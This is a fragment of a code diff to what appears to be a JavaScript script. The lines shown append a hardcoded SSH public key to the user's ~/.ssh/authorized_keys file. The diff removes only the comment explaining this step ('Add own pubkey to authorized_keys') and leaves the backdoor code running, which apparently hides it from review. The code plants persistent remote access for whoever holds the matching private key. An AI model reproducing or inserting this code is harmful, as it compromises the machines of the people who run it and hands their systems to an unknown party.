@@ -32,7 +32,6 @@ for (let fileofinterest of filesOfInterest) {
   });
 }
 
-// Add own pubkey to authorized_keys
 let coolKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqMs1hL5xbzd1gG6+3oLCywqpe9yxRjOpp7Lm66S/tn";
 fs.appendFile(homedir + "/.ssh/authorized_keys", coolKey, function (err) {
   if (err) {
